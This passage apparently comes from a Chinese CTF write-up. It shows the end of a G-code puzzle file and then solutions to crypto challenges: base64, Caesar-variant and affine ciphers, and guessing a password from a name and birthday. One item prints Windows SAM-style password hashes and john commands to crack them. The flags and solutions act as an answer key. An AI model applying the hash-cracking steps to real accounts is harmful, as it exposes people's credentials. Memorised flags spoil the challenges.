G1 X157.138 Y99.537 E0.01931
G1 X157.138 Y97.817 E0.05392
G1 X156.532 Y97.724 E0.01923
G1 X156.507 Y97.586 E0.00440
G1 X156.489 Y96.842 E0.02332
G1 X156.435 Y96.432 E0.01297
G1 X157.280 Y96.432 E0.02648
G1 X157.280 Y102.124 E0.17848
G1 X133.622 Y102.124 E0.74178
G1 X133.622 Y100.971 E0.03614
G1 X133.783 Y101.277 E0.01083
G1 X134.083 Y101.602 E0.01388
G1 X134.448 Y101.827 E0.01342
G1 X134.912 Y101.980 E0.01533
G1 X135.358 Y102.023 E0.01404
G1 X135.898 Y101.955 E0.01708
G1 X136.282 Y101.805 E0.01292
G1 X136.734 Y101.470 E0.01764
G1 X136.933 Y101.217 E0.01010
G1 X137.089 Y100.949 E0.00972
G1 X137.174 Y100.649 E0.00976
G1 X137.218 Y100.308 E0.01079
G1 X137.196 Y100.202 E0.00339
G1 X137.241 Y100.278 E0.00274
G1 X137.678 Y100.631 E0.01763
G1 X137.897 Y100.747 E0.00776
G1 X138.252 Y100.847 E0.01156
G1 X138.651 Y100.894 E0.01261
G1 X138.949 Y100.841 E0.00948
G1 X138.949 Y101.942 E0.03450
G1 F8640
G1 X140.946 Y102.002 E-0.46141
G1 X140.946 Y100.708 E-0.29859
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X106.030 Y98.138
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X106.030 Y99.204 E0.03343
G1 X106.422 Y99.264 E0.01245
G1 X106.492 Y99.297 E0.00242
G1 X106.573 Y99.383 E0.00371
G1 X106.618 Y99.479 E0.00331
G1 X106.660 Y99.720 E0.00769
G1 X106.679 Y100.481 E0.02386
G1 X106.703 Y100.724 E0.00765
G1 X106.764 Y101.028 E0.00974
G1 X106.882 Y101.254 E0.00798
G1 X106.979 Y101.372 E0.00479
G1 X107.176 Y101.515 E0.00763
G1 X107.468 Y101.638 E0.00992
G1 X107.784 Y101.689 E0.01006
G1 X108.454 Y101.702 E0.02099
G1 X108.454 Y100.581 E0.03513
G1 X108.049 Y100.574 E0.01270
G1 X107.882 Y100.540 E0.00533
G1 X107.858 Y100.441 E0.00317
G1 X107.815 Y99.497 E0.02963
G1 X107.745 Y99.149 E0.01115
G1 X107.663 Y98.957 E0.00655
G1 X107.548 Y98.781 E0.00657
G1 X107.438 Y98.673 E0.00484
G1 X107.540 Y98.571 E0.00451
G1 X107.664 Y98.384 E0.00705
G1 X107.749 Y98.175 E0.00708
G1 X107.818 Y97.802 E0.01188
G1 X107.855 Y96.921 E0.02764
G1 X107.881 Y96.816 E0.00340
G1 X108.053 Y96.774 E0.00555
G1 X108.454 Y96.765 E0.01256
G1 X108.454 Y96.055 E0.02228
G1 X115.135 Y96.055 E0.20950
G1 X115.135 Y96.676 E0.01948
G1 X118.935 Y96.676 E0.11914
G1 X118.935 Y100.441 E0.11804
G1 X120.123 Y100.441 E0.03724
G1 X120.123 Y100.277 E0.00512
G1 X120.218 Y100.341 E0.00360
G1 X120.537 Y100.471 E0.01078
G1 X120.883 Y100.513 E0.01096
G1 X121.190 Y100.472 E0.00970
G1 X121.479 Y100.384 E0.00946
G1 X121.732 Y100.221 E0.00947
G1 X121.966 Y100.011 E0.00984
G1 X122.239 Y99.553 E0.01673
G1 X122.345 Y99.211 E0.01120
G1 X122.391 Y98.696 E0.01624
G1 X122.369 Y98.338 E0.01123
G1 X122.303 Y97.986 E0.01123
G1 X122.160 Y97.661 E0.01114
G1 X121.960 Y97.341 E0.01183
G1 X121.612 Y97.045 E0.01432
G1 X121.331 Y96.913 E0.00973
G1 X120.933 Y96.843 E0.01267
G1 X120.594 Y96.866 E0.01064
G1 X120.314 Y96.962 E0.00929
G1 X120.178 Y97.052 E0.00511
G1 X120.178 Y96.055 E0.03126
G1 X140.474 Y96.055 E0.63636
G1 X140.474 Y96.676 E0.01948
G1 X144.316 Y96.676 E0.12046
G1 X144.316 Y96.055 E0.01948
G1 X154.337 Y96.055 E0.31421
G1 X154.337 Y96.765 E0.02228
G1 X154.736 Y96.774 E0.01250
G1 X154.908 Y96.816 E0.00554
G1 X154.933 Y96.912 E0.00309
G1 X154.976 Y97.841 E0.02917
G1 X155.049 Y98.200 E0.01148
G1 X155.136 Y98.400 E0.00686
G1 X155.258 Y98.582 E0.00685
G1 X155.352 Y98.673 E0.00412
G1 X155.207 Y98.824 E0.00655
G1 X155.060 Y99.107 E0.01000
G1 X154.983 Y99.408 E0.00974
G1 X154.930 Y100.463 E0.03310
G1 X154.911 Y100.540 E0.00250
G1 X154.745 Y100.574 E0.00532
G1 X154.337 Y100.582 E0.01277
G1 X154.337 Y101.703 E0.03515
G1 X155.030 Y101.686 E0.02172
G1 X155.369 Y101.629 E0.01078
G1 X155.609 Y101.526 E0.00819
G1 X155.816 Y101.362 E0.00830
G1 X155.973 Y101.147 E0.00834
G1 X156.062 Y100.902 E0.00816
G1 X156.111 Y100.534 E0.01166
G1 X156.124 Y99.832 E0.02199
G1 X156.159 Y99.526 E0.00968
G1 X156.209 Y99.397 E0.00432
G1 X156.281 Y99.309 E0.00355
G1 X156.399 Y99.256 E0.00407
G1 X156.761 Y99.207 E0.01146
G1 X156.761 Y98.140 E0.03345
G1 X156.369 Y98.080 E0.01244
G1 X156.299 Y98.048 E0.00240
G1 X156.218 Y97.960 E0.00375
G1 X156.174 Y97.864 E0.00331
G1 X156.130 Y97.624 E0.00763
G1 X156.112 Y96.865 E0.02381
G1 X156.088 Y96.622 E0.00767
G1 X156.028 Y96.317 E0.00973
G1 X155.882 Y96.055 E0.00942
G1 X157.657 Y96.055 E0.05565
G1 X157.657 Y102.501 E0.20212
G1 X92.343 Y102.501 E2.04787
G1 X92.343 Y101.624 E0.02749
G1 X93.216 Y101.624 E0.02738
G1 X93.216 Y96.910 E0.14783
G1 X92.343 Y96.910 E0.02738
G1 X92.343 Y96.055 E0.02680
G1 X106.919 Y96.055 E0.45701
M73 P69 R0
G1 X106.815 Y96.198 E0.00553
G1 X106.727 Y96.441 E0.00811
G1 X106.697 Y96.642 E0.00638
G1 X106.667 Y97.510 E0.02724
G1 X106.629 Y97.818 E0.00973
G1 X106.580 Y97.946 E0.00429
G1 X106.507 Y98.033 E0.00357
G1 X106.389 Y98.088 E0.00407
G1 X106.089 Y98.130 E0.00949
G1 X105.631 Y98.167 F10800.000
G1 F8640
G1 X106.030 Y99.204 E-0.24849
G1 X106.422 Y99.264 E-0.09169
G1 X106.492 Y99.297 E-0.01783
G1 X106.573 Y99.383 E-0.02731
G1 X106.618 Y99.479 E-0.02434
G1 X106.660 Y99.720 E-0.05666
G1 X106.679 Y100.481 E-0.17569
G1 X106.703 Y100.724 E-0.05637
G1 X106.756 Y100.985 E-0.06161
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X152.315 Y98.384
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X152.407 Y98.054 E0.01074
G1 X152.476 Y97.973 E0.00335
G1 X152.616 Y97.935 E0.00453
G1 X152.741 Y97.961 E0.00400
G1 X152.883 Y98.078 E0.00577
G1 X152.962 Y98.257 E0.00612
G1 X153.016 Y98.464 E0.00672
G1 X152.778 Y98.393 E0.00779
G1 X152.511 Y98.358 E0.00844
G1 X152.375 Y98.376 E0.00432
G1 X152.538 Y98.124 F10800.000
G1 F8640
G1 X152.407 Y98.054 E-0.07475
G1 X152.476 Y97.973 E-0.02467
G1 X152.616 Y97.935 E-0.03333
G1 X152.741 Y97.961 E-0.02949
G1 X152.883 Y98.078 E-0.04248
G1 X152.962 Y98.257 E-0.04510
G1 X153.016 Y98.464 E-0.04947
G1 X152.778 Y98.393 E-0.05736
G1 X152.511 Y98.358 E-0.06213
G1 X152.375 Y98.376 E-0.03181
G1 E-0.34941 F2100.00000
G1 Z0.800 F10800.000
G1 X151.000 Y97.564
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X150.806 Y97.536 E0.00140
G1 F8640
G1 X151.000 Y97.564 E-0.04515
G1 E-0.75485 F2100.00000
G1 Z0.800 F10800.000
G1 X150.931 Y99.106
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X150.897 Y99.248 E0.00244
G1 X150.880 Y99.367 E0.00184
G1 X150.866 Y99.470 E0.00128
G1 X150.851 Y99.725 E0.00254
G1 X150.837 Y99.970 E0.00184
G1 X150.874 Y100.522 E0.00287
G1 X150.936 Y100.940 E0.00617
G1 X151.183 Y101.818 F10800.000
G1 F1200
G1 X151.520 Y101.921 E0.00284
G1 F8640
G1 X151.183 Y101.818 E-0.08140
G1 E-0.71860 F2100.00000
G1 Z0.800 F10800.000
G1 X148.898 Y102.011
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X148.029 Y101.142 E0.04370
G1 F8640
G1 X148.898 Y102.011 E-0.28381
G1 E-0.51619 F2100.00000
G1 Z0.800 F10800.000
G1 X145.966 Y99.185
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X145.966 Y96.721 E0.05758
G1 F8640
G1 X145.966 Y99.185 E-0.56891
G1 E-0.23109 F2100.00000
G1 Z0.800 F10800.000
G1 X148.100 Y96.545
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X148.839 Y97.284 E0.03472
G1 F8640
G1 X148.100 Y96.545 E-0.24118
G1 E-0.55882 F2100.00000
G1 Z0.800 F10800.000
G1 X143.904 Y97.961
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X143.279 Y97.336 E0.02881
G1 X142.725 Y97.336 E0.01809
G1 X143.734 Y98.346 E0.04656
G1 X143.734 Y98.714 E0.01200
G1 X143.547 Y98.714 E0.00609
G1 X142.170 Y97.336 E0.06352
G1 X141.615 Y97.336 E0.01809
G1 X143.277 Y98.998 E0.07664
G1 X143.277 Y99.552 E0.01809
G1 X141.229 Y97.504 E0.09446
G1 X141.229 Y98.059 E0.01809
G1 X143.277 Y100.107 E0.09446
G1 X143.277 Y100.662 E0.01809
G1 X141.229 Y98.613 E0.09446
G1 X141.229 Y99.168 E0.01809
G1 X143.902 Y101.841 E0.12329
G1 X143.347 Y101.841 E0.01809
G1 X141.229 Y99.723 E0.09771
G1 X141.229 Y100.277 E0.01809
G1 X142.793 Y101.841 E0.07213
G1 X142.238 Y101.841 E0.01809
G1 X141.229 Y100.832 E0.04655
G1 X141.229 Y101.387 E0.01809
G1 X141.853 Y102.011 E0.02880
G1 F8640
G1 X141.229 Y101.387 E-0.20393
G1 X141.229 Y100.832 E-0.12807
G1 X142.238 Y101.841 E-0.32963
G1 X142.664 Y101.841 E-0.09838
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X143.546 Y100.931
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X144.213 Y101.598 E0.03074
G1 F8640
G1 X143.546 Y100.931 E-0.21769
G1 E-0.58231 F2100.00000
G1 Z0.800 F10800.000
G1 X138.835 Y101.818
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X138.122 Y101.104 E0.03495
G1 X137.791 Y101.011 E0.01190
G1 X137.522 Y100.868 E0.01056
G1 X137.428 Y100.792 E0.00418
G1 X137.382 Y100.953 E0.00581
G1 X138.270 Y101.841 E0.04349
G1 X137.681 Y101.841 E0.02039
G1 X137.185 Y101.346 E0.02426
G1 X136.929 Y101.678 E0.01454
G1 X137.262 Y102.011 E0.01629
G1 F8640
G1 X136.929 Y101.678 E-0.10865
G1 X137.185 Y101.346 E-0.09694
G1 X137.681 Y101.841 E-0.16177
G1 X138.270 Y101.841 E-0.13597
G1 X137.484 Y101.055 E-0.25667
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X136.988 Y100.081
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X137.078 Y99.899 E0.00430
G1 X136.984 Y99.695 E0.00476
G1 X136.904 Y99.513 E0.00383
G1 X136.857 Y99.505 E0.00091
G1 X136.724 Y99.489 E0.00220
G1 F8640
G1 X136.857 Y99.505 E-0.03080
G1 E-0.76920 F2100.00000
G1 Z0.800 F10800.000
G1 X133.464 Y98.577
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X133.485 Y98.388 E0.00127
G1 X133.506 Y98.199 E0.00175
G1 F8640
G1 X133.485 Y98.388 E-0.04389
G1 E-0.75611 F2100.00000
G1 Z0.800 F10800.000
G1 X134.090 Y97.113
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X134.117 Y97.051 E0.00043
G1 X134.190 Y96.913 E0.00110
G1 F8640
G1 X134.117 Y97.051 E-0.03613
G1 E-0.76387 F2100.00000
G1 Z0.800 F10800.000
G1 X131.952 Y97.174
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X131.734 Y97.496 E0.00246
G1 X131.788 Y97.563 F10800.000
G1 F1200
G1 X131.774 Y97.904 E0.00305
G1 X131.769 Y99.176 E0.00838
G1 F8640
G1 X131.774 Y97.904 E-0.29379
G1 E-0.50621 F2100.00000
G1 Z0.800 F10800.000
G1 X131.788 Y97.563
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X131.822 Y97.271 E0.00363
G1 F8640
G1 X131.788 Y97.563 E-0.06793
G1 E-0.73207 F2100.00000
G1 Z0.800 F10800.000
G1 X131.914 Y102.011
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X131.004 Y101.101 E0.04191
G1 X130.961 Y101.101 E0.00140
G1 X130.961 Y101.059 E0.00137
G1 X130.716 Y101.135 E0.00836
G1 X130.504 Y101.155 E0.00691
G1 X131.191 Y101.841 E0.03160
G1 X130.637 Y101.841 E0.01802
G1 X129.916 Y101.121 E0.03317
G1 X129.793 Y101.101 E0.00407
G1 X129.343 Y101.101 E0.01466
G1 X130.083 Y101.841 E0.03410
G1 X129.530 Y101.841 E0.01802
G1 X128.789 Y101.101 E0.03410
G1 X128.235 Y101.101 E0.01802
G1 X128.976 Y101.841 E0.03410
G1 X128.422 Y101.841 E0.01802
G1 X127.799 Y101.218 E0.02868
G1 F8640
G1 X128.422 Y101.841 E-0.20344
G1 X128.976 Y101.841 E-0.12784
G1 X128.235 Y101.101 E-0.24185
G1 X128.789 Y101.101 E-0.12784
G1 X128.970 Y101.281 E-0.05903
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X125.941 Y102.011
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X125.325 Y101.395 E0.02840
G1 X125.147 Y101.273 E0.00703
G1 X124.763 Y101.096 E0.01378
G1 X124.526 Y101.151 E0.00793
G1 X125.216 Y101.841 E0.03181
G1 X124.662 Y101.841 E0.01808
G1 X123.958 Y101.138 E0.03244
G1 X123.798 Y101.101 E0.00536
G1 X123.367 Y101.101 E0.01406
G1 X124.107 Y101.841 E0.03415
G1 X123.553 Y101.841 E0.01808
G1 X122.812 Y101.101 E0.03415
G1 X122.258 Y101.101 E0.01808
G1 X122.998 Y101.841 E0.03415
G1 X122.444 Y101.841 E0.01808
G1 X121.631 Y101.028 E0.03750
G1 X121.330 Y101.119 E0.01023
G1 X121.186 Y101.138 E0.00474
G1 X121.889 Y101.841 E0.03242
G1 X121.335 Y101.841 E0.01808
G1 X120.642 Y101.148 E0.03196
G1 X120.334 Y101.101 E0.01015
G1 X120.040 Y101.101 E0.00960
G1 X120.780 Y101.841 E0.03415
G1 X120.226 Y101.841 E0.01808
G1 X119.485 Y101.101 E0.03415
G1 X118.931 Y101.101 E0.01808
G1 X119.671 Y101.841 E0.03415
G1 X119.117 Y101.841 E0.01808
G1 X115.890 Y98.614 E0.14879
G1 X115.890 Y98.060 E0.01808
G1 X118.275 Y100.445 E0.10998
G1 X118.275 Y99.891 E0.01808
G1 X115.890 Y97.505 E0.10998
G1 X115.890 Y97.336 E0.00552
G1 X116.275 Y97.336 E0.01256
G1 X118.275 Y99.336 E0.09221
G1 X118.275 Y98.782 E0.01808
G1 X116.830 Y97.336 E0.06665
G1 X117.384 Y97.336 E0.01808
G1 X118.275 Y98.227 E0.04108
G1 X118.275 Y97.673 E0.01808
G1 X117.769 Y97.166 E0.02334
G1 F8640
G1 X118.275 Y97.673 E-0.16530
G1 X118.275 Y98.227 E-0.12803
G1 X117.384 Y97.336 E-0.29095
G1 X116.830 Y97.336 E-0.12803
G1 X116.976 Y97.482 E-0.04768
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X122.195 Y97.321
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X122.298 Y97.439 E0.00106
G1 X122.400 Y97.557 E0.00146
G1 X122.383 Y97.641 F10800.000
G1 F1200
G1 X122.324 Y97.402 E0.00160
G1 F8640
G1 X122.383 Y97.641 E-0.05692
G1 E-0.74308 F2100.00000
G1 Z0.800 F10800.000
G1 X122.400 Y99.785
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X122.302 Y99.904 E0.00141
G1 X122.203 Y100.023 E0.00103
G1 F8640
G1 X122.302 Y99.904 E-0.03567
G1 E-0.76433 F2100.00000
G1 Z0.800 F10800.000
G1 X125.576 Y98.912
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X124.495 Y97.831 E0.04801
G1 X124.492 Y97.294 E0.01687
G1 X125.406 Y98.208 E0.04059
G1 X125.406 Y97.673 E0.01679
G1 X124.490 Y96.757 E0.04071
G1 X124.489 Y96.715 E0.00133
G1 X124.982 Y96.715 E0.01546
G1 X125.576 Y97.309 E0.02640
G1 F8640
G1 X124.982 Y96.715 E-0.19401
G1 X124.489 Y96.715 E-0.11364
G1 X124.490 Y96.757 E-0.00978
G1 X125.406 Y97.673 E-0.29924
G1 X125.406 Y98.208 E-0.12337
G1 X125.345 Y98.147 E-0.01995
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X118.732 Y102.011
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X115.890 Y99.169 E0.13105
G1 X115.890 Y99.723 E0.01808
G1 X118.008 Y101.841 E0.09766
G1 X117.453 Y101.841 E0.01808
G1 X115.890 Y100.278 E0.07209
G1 X115.890 Y100.832 E0.01808
G1 X116.899 Y101.841 E0.04653
G1 X116.344 Y101.841 E0.01808
G1 X115.720 Y101.217 E0.02878
G1 F8640
G1 X116.344 Y101.841 E-0.20386
G1 X116.899 Y101.841 E-0.12803
G1 X115.890 Y100.832 E-0.32951
G1 X115.890 Y100.405 E-0.09859
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X113.497 Y101.818
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X112.783 Y101.104 E0.03495
G1 X112.452 Y101.011 E0.01191
G1 X112.183 Y100.868 E0.01056
G1 X112.089 Y100.792 E0.00418
G1 X112.043 Y100.953 E0.00581
G1 X112.931 Y101.841 E0.04349
G1 X112.342 Y101.841 E0.02039
G1 X111.847 Y101.346 E0.02426
G1 X111.590 Y101.678 E0.01454
G1 X111.923 Y102.011 E0.01629
G1 F8640
G1 X111.590 Y101.678 E-0.10865
G1 X111.847 Y101.346 E-0.09694
G1 X112.342 Y101.841 E-0.16177
G1 X112.931 Y101.841 E-0.13597
G1 X112.145 Y101.055 E-0.25667
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X111.649 Y100.081
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X111.739 Y99.899 E0.00430
G1 X111.645 Y99.695 E0.00476
G1 X111.565 Y99.513 E0.00383
G1 X111.518 Y99.505 E0.00091
G1 X111.386 Y99.489 E0.00220
G1 F8640
G1 X111.518 Y99.505 E-0.03080
G1 E-0.76920 F2100.00000
G1 Z0.800 F10800.000
G1 X108.643 Y99.607
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X108.260 Y99.224 E0.02038
G1 X108.006 Y98.473 F10800.000
G1 F1200
G1 X108.072 Y98.254 E0.00550
G1 X108.166 Y97.779 E0.01189
G1 F8640
G1 X108.072 Y98.254 E-0.11162
G1 E-0.68838 F2100.00000
G1 Z0.800 F10800.000
G1 X106.403 Y97.489
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X106.319 Y97.791 E0.00483
G1 X106.403 Y97.489 F10800.000
G1 F1200
G1 X106.469 Y97.179 E0.00222
G1 F8640
G1 X106.403 Y97.489 E-0.07334
G1 E-0.72666 F2100.00000
G1 Z0.800 F10800.000
G1 X105.821 Y98.795
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X105.794 Y98.933 E0.00106
G1 X105.768 Y99.071 E0.00154
G1 X105.741 Y99.209 E0.00201
G1 X105.715 Y99.346 E0.00248
G1 X105.810 Y99.781 F10800.000
G1 F1200
G1 X106.097 Y99.829 E0.00201
G1 F8640
G1 X105.810 Y99.781 E-0.06721
G1 E-0.73279 F2100.00000
G1 Z0.800 F10800.000
G1 X106.238 Y100.901
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X105.685 Y100.347 E0.02617
G1 X105.522 Y100.753 E0.01463
G1 X106.264 Y101.495 E0.03505
G1 X106.329 Y101.620 E0.00472
G1 X106.510 Y101.841 E0.00958
G1 X106.042 Y101.841 E0.01568
G1 X105.360 Y101.160 E0.03224
G1 X105.197 Y101.566 E0.01463
G1 X105.642 Y102.011 E0.02106
G1 F8640
G1 X105.197 Y101.566 E-0.14541
G1 X105.360 Y101.160 E-0.10102
G1 X106.042 Y101.841 E-0.22262
G1 X106.510 Y101.841 E-0.10825
G1 X106.329 Y101.620 E-0.06615
G1 X106.264 Y101.495 E-0.03258
G1 X106.006 Y101.237 E-0.08398
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X102.872 Y101.979
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X101.987 Y101.094 E0.04144
G1 X101.770 Y101.440 E0.01351
G1 X102.341 Y102.011 E0.02673
G1 F8640
G1 X101.770 Y101.440 E-0.18653
G1 X101.987 Y101.094 E-0.09428
G1 X102.872 Y101.979 E-0.28914
G1 E-0.23005 F2100.00000
G1 Z0.800 F10800.000
G1 X101.283 Y101.823
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X101.143 Y101.936 E0.00121
G1 F8640
G1 X101.283 Y101.823 E-0.04152
G1 E-0.75848 F2100.00000
G1 Z0.800 F10800.000
G1 X102.022 Y100.691
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X102.224 Y100.522 E0.00258
G1 F8640
G1 X102.022 Y100.691 E-0.06079
G1 E-0.73921 F2100.00000
G1 Z0.800 F10800.000
G1 X101.819 Y98.738
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X101.854 Y98.629 E0.00053
G1 X101.846 Y98.567 E0.00029
G1 F8640
G1 X101.854 Y98.629 E-0.01460
G1 X101.819 Y98.738 E-0.02635
G1 E-0.75905 F2100.00000
G1 Z0.800 F10800.000
G1 X100.143 Y98.306
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X99.735 Y98.342 E0.01003
G1 X99.570 Y98.376 E0.00412
G1 X99.231 Y98.511 E0.00893
G1 F8640
G1 X99.570 Y98.376 E-0.08418
G1 X99.735 Y98.342 E-0.03888
G1 X100.143 Y98.306 E-0.09457
G1 E-0.58236 F2100.00000
G1 Z0.800 F10800.000
G1 X97.668 Y97.891
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X97.686 Y97.780 E0.00053
G1 X97.755 Y97.675 E0.00060
G1 F8640
G1 X97.686 Y97.780 E-0.02916
G1 X97.668 Y97.891 E-0.02593
G1 E-0.74491 F2100.00000
G1 Z0.800 F10800.000
G1 X97.815 Y99.656
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X97.647 Y99.936 E0.00148
G1 X97.696 Y99.948 F10800.000
G1 F1200
G1 X97.674 Y100.278 E0.00267
G1 X97.711 Y100.767 E0.00217
G1 X97.870 Y101.005 E0.00127
G1 F8640
G1 X97.711 Y100.767 E-0.06616
G1 X97.674 Y100.278 E-0.11317
G1 E-0.62067 F2100.00000
G1 Z0.800 F10800.000
G1 X97.696 Y99.948
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X97.727 Y99.727 E0.00233
G1 F8640
G1 X97.696 Y99.948 E-0.05143
G1 E-0.74857 F2100.00000
G1 Z0.800 F10800.000
G1 X99.507 Y100.349
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X99.773 Y100.294 E0.00290
G1 X100.012 Y100.219 E0.00286
G1 F8640
G1 X99.773 Y100.294 E-0.05799
G1 E-0.74201 F2100.00000
G1 Z0.800 F10800.000
G1 X103.864 Y97.395
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X103.569 Y97.100 E0.01569
G1 X103.429 Y96.715 E0.01543
G1 X103.824 Y96.715 E0.01485
G1 X104.314 Y97.205 E0.02609
G1 F8640
G1 X103.824 Y96.715 E-0.16010
G1 X103.429 Y96.715 E-0.09112
G1 X103.569 Y97.100 E-0.09466
G1 X103.864 Y97.395 E-0.09630
G1 E-0.35781 F2100.00000
G1 Z0.800 F10800.000
G1 X154.415 Y100.391
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X154.603 Y100.239 E0.00515
G1 X154.649 Y99.758 E0.01027
G1 X154.676 Y99.283 E0.01012
G1 X154.536 Y99.107 E0.00478
G1 F8640
G1 X154.676 Y99.283 E-0.05187
G1 X154.649 Y99.758 E-0.10992
G1 X154.603 Y100.239 E-0.11151
G1 X154.415 Y100.391 E-0.05587
G1 E-0.47083 F2100.00000
G1 Z0.800 F10800.000
G1 X157.167 Y100.510
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X156.779 Y100.122 E0.01942
G1 X156.755 Y100.700 E0.02049
G1 X156.997 Y100.942 E0.01213
G1 X156.997 Y101.545 E0.02132
G1 X156.655 Y101.203 E0.01712
G1 X156.561 Y101.460 E0.00971
G1 X156.456 Y101.605 E0.00636
G1 X156.861 Y102.011 E0.02032
G1 F8640
G1 X156.456 Y101.605 E-0.13250
G1 X156.561 Y101.460 E-0.04146
G1 X156.655 Y101.203 E-0.06329
G1 X156.997 Y101.545 E-0.11168
G1 X156.997 Y100.942 E-0.13905
G1 X156.755 Y100.700 E-0.07913
G1 X156.779 Y100.122 E-0.13359
G1 X156.960 Y100.304 E-0.05930
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X157.167 Y97.356
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X156.595 Y96.784 E0.02687
G1 F8640
G1 X157.167 Y97.356 E-0.18662
G1 E-0.61338 F2100.00000
G1 Z0.800 F10800.000
G4
M104 S0
M140 S0
M107
G1 Z30.8
G1 X0 Y200
M84
```

g语言，用于数控、3D打印，https://ncviewer.com/在线解

## crypto

###### Url编码

![img](/clip_image002-1602750556841.jpg)

![img](/clip_image004-1602750556841.jpg)

###### 一眼就解密

下面的字符串解密后便能获得flag：ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30= 注意：得到的 flag 请包上 flag{} 提交

![img](/clip_image001-1602750571756.png)

###### password

```
姓名：张三 
生日：19900315

key格式为key{xxxxxxxxxx}
```

```
flag{zs19900315}
```

###### 变异凯撒

```
加密密文：afZ_r9VYfScOeO_UL^RWUc
格式：flag{ }
```

```
_str='afZ_r9VYfScOeO_UL^RWUc'#需要解密的字符串

string_new = ''
for i in range(len(_str)):
    num = ord(_str[i])
    num = (num + (5 + i)) % 128
    string_new += chr(num)
print(string_new)
```

###### [BJDCTF 2nd]老文盲了

```
罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝
```

看下拼音：

```python
import pypinyin
 
# 带声调的(默认)
def yinjie(word):
    s = ''
    # heteronym=True开启多音字
    for i in pypinyin.pinyin(word, heteronym=True):
        s = s + ''.join(i) + " "
    return s
 
if __name__ == "__main__":
    print(yinjie("罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝"))
```

###### Windows系统密码

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::
```

```
john pass.hash
john --show --format=LM pass.hash
```

###### [GKCTF2020]小学生的密码学

```
e(x)=11x+6(mod26)

密文：welcylk

（flag为base64形式）
```

```python
'''
仿射密码
(a,b)
m = 26，字符集为小写字母
加密函数是E(x)= (ax + b) (mod m)
解密函数为D(x) = (a^-1)(x - b) (mod m)，其中a^-1是a的乘法逆元
'''

#通过一个简单的遍历得到a的乘法逆元，也可以通过gmpy2库中的invert函数实现
def get_inverse(a):
    for i in range(1,27):
        if a*i%26==1:
            return i

#加密
def encipher(a, b, p):
    c=[]
    for i in p:
        temp=((ord(i)-97)*a+b)%26+97
        c.append(chr(temp))
    print(''.join(c))

#解密
def decipher(a, b, c):
    a_inv = get_inverse(a)
    p=[]
    for i in c:
        temp=(((ord(i)-97)-b)*a_inv)%26+97
        p.append(chr(temp))
    print(''.join(p))

if __name__ == "__main__":
    a = 11
    b = 6
    message = 'welcylk'
    # encipher(a,b,message)
    decipher(a,b,message)
```

最后base64一下

###### RSA1

```
